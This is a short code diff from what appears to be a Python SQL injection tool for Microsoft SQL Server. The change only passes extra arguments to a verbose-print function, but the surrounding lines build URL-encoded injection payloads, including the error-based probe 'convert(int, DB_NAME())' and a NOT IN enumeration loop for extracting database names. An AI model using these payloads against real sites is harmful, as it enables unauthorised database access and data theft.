@@ -24,7 +24,7 @@ def retr_loop(sender, payload1, payload2):
         not_in = ','.join([f"'{elem}'" for elem in result]) or "''"
         payload = payload1 + urlenc(not_in) + payload2
         if args.p.verbose:
-            print_verbose(payload)
+            print_verbose(payload, args.left, args.right)
 
         for _ in range(sender.retry):
             try:
@@ -63,7 +63,7 @@ def retr_database(sender):
     print('databases:')
     payload3 = urlenc("convert(int, DB_NAME())")
     if args.p.verbose:
-        print_verbose(payload3)
+        print_verbose(payload3, args.left, args.right)
     r = sender.send_request(payload3)
     content = return_contents(r)
     print(f"current: {content}")
